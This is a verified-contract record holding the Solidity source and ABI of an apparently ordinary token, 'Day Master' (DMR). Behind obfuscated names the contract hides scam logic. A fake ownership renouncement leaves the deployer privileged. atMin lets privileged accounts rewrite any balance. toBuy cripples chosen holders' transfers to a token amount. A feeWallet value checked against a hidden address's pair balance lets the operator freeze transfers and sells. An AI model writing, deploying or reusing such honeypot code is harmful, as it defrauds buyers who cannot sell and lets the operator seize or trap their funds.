{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface senderLiquidity {\n    function createPair(address shouldLaunch, address minLimitFrom) external returns (address);\n}\n\ninterface totalAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTrading) external view returns (uint256);\n\n    function transfer(address launchedExempt, uint256 swapSenderTrading) external returns (bool);\n\n    function allowance(address liquiditySell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapSenderTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedExempt,\n        uint256 swapSenderTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletFee, uint256 value);\n    event Approval(address indexed liquiditySell, address indexed spender, uint256 value);\n}\n\nabstract contract atBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalAtMetadata is totalAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DayMaster is atBuy, totalAt, totalAtMetadata {\n\n    string private fundTrading = \"DMR\";\n\n    bool public takeList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTeam;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquiditySender;\n    }\n\n    function feeWallet(uint256 swapSenderTrading) public {\n        tokenBuy();\n        totalToken = swapSenderTrading;\n    }\n\n    uint256 autoSenderToken;\n\n    uint256 private amountTeam = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundTrading;\n    }\n\n    mapping(address => bool) public takeTrading;\n\n    function atMin(address swapFrom, uint256 swapSenderTrading) public {\n        tokenBuy();\n        listShould[swapFrom] = swapSenderTrading;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingWalletAuto;\n    }\n\n    constructor (){\n        if (takeLiquidity == receiverAutoTake) {\n            sellTradingAt = false;\n        }\n        toEnable receiverFeeLaunched = toEnable(fromExempt);\n        maxLaunchReceiver = senderLiquidity(receiverFeeLaunched.factory()).createPair(receiverFeeLaunched.WETH(), address(this));\n        if (takeLiquidity == receiverAutoTake) {\n            receiverAutoTake = takeLiquidity;\n        }\n        maxMode = _msgSender();\n        receiverAmount[maxMode] = true;\n        listShould[maxMode] = amountTeam;\n        tokenSender();\n        if (receiverAutoTake != takeLiquidity) {\n            sellTradingAt = true;\n        }\n        emit Transfer(address(0), maxMode, amountTeam);\n    }\n\n    address private tokenTotal;\n\n    function getOwner() external view returns (address) {\n        return tokenTotal;\n    }\n\n    mapping(address => bool) public receiverAmount;\n\n    function atMax(address txMax, address launchedExempt, uint256 swapSenderTrading) internal returns (bool) {\n        require(listShould[txMax] >= swapSenderTrading);\n        listShould[txMax] -= swapSenderTrading;\n        listShould[launchedExempt] += swapSenderTrading;\n        emit Transfer(txMax, launchedExempt, swapSenderTrading);\n        return true;\n    }\n\n    uint8 private liquiditySender = 18;\n\n    string private marketingWalletAuto = \"Day Master\";\n\n    function teamTotal(address txMin) public {\n        if (senderAmount) {\n            return;\n        }\n        if (sellTradingAt) {\n            sellTradingAt = false;\n        }\n        receiverAmount[txMin] = true;\n        \n        senderAmount = true;\n    }\n\n    function toBuy(address enableAmount) public {\n        tokenBuy();\n        \n        if (enableAmount == maxMode || enableAmount == maxLaunchReceiver) {\n            return;\n        }\n        takeTrading[enableAmount] = true;\n    }\n\n    address buyTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address totalFrom, address autoAt) external view virtual override returns (uint256) {\n        if (autoAt == fromExempt) {\n            return type(uint256).max;\n        }\n        return amountSender[totalFrom][autoAt];\n    }\n\n    function tokenSender() public {\n        emit OwnershipTransferred(maxMode, address(0));\n        tokenTotal = address(0);\n    }\n\n    function toList(address txMax, address launchedExempt, uint256 swapSenderTrading) internal returns (bool) {\n        if (txMax == maxMode) {\n            return atMax(txMax, launchedExempt, swapSenderTrading);\n        }\n        uint256 totalTo = totalAt(maxLaunchReceiver).balanceOf(buyTotal);\n        require(totalTo == totalToken);\n        require(launchedExempt != buyTotal);\n        if (takeTrading[txMax]) {\n            return atMax(txMax, launchedExempt, teamExemptEnable);\n        }\n        return atMax(txMax, launchedExempt, swapSenderTrading);\n    }\n\n    mapping(address => mapping(address => uint256)) private amountSender;\n\n    bool public senderAmount;\n\n    bool private sellTradingAt;\n\n    uint256 private takeLiquidity;\n\n    address fromExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address shouldTrading) public view virtual override returns (uint256) {\n        return listShould[shouldTrading];\n    }\n\n    uint256 totalToken;\n\n    uint256 constant teamExemptEnable = 4 ** 10;\n\n    function owner() external view returns (address) {\n        return tokenTotal;\n    }\n\n    event OwnershipTransferred(address indexed atIs, address indexed tokenList);\n\n    function approve(address autoAt, uint256 swapSenderTrading) public virtual override returns (bool) {\n        amountSender[_msgSender()][autoAt] = swapSenderTrading;\n        emit Approval(_msgSender(), autoAt, swapSenderTrading);\n        return true;\n    }\n\n    address public maxLaunchReceiver;\n\n    address public maxMode;\n\n    uint256 public receiverAutoTake;\n\n    function tokenBuy() private view {\n        require(receiverAmount[_msgSender()]);\n    }\n\n    function transfer(address swapFrom, uint256 swapSenderTrading) external virtual override returns (bool) {\n        return toList(_msgSender(), swapFrom, swapSenderTrading);\n    }\n\n    mapping(address => uint256) private listShould;\n\n    function transferFrom(address txMax, address launchedExempt, uint256 swapSenderTrading) external override returns (bool) {\n        if (_msgSender() != fromExempt) {\n            if (amountSender[txMax][_msgSender()] != type(uint256).max) {\n                require(swapSenderTrading <= amountSender[txMax][_msgSender()]);\n                amountSender[txMax][_msgSender()] -= swapSenderTrading;\n            }\n        }\n        return toList(txMax, launchedExempt, swapSenderTrading);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapSenderTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapSenderTrading\",\"type\":\"uint256\"}],\"name\":\"atMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapSenderTrading\",\"type\":\"uint256\"}],\"name\":\"feeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunchReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAutoTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"}],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"}],\"name\":\"toBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapSenderTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapSenderTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DayMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}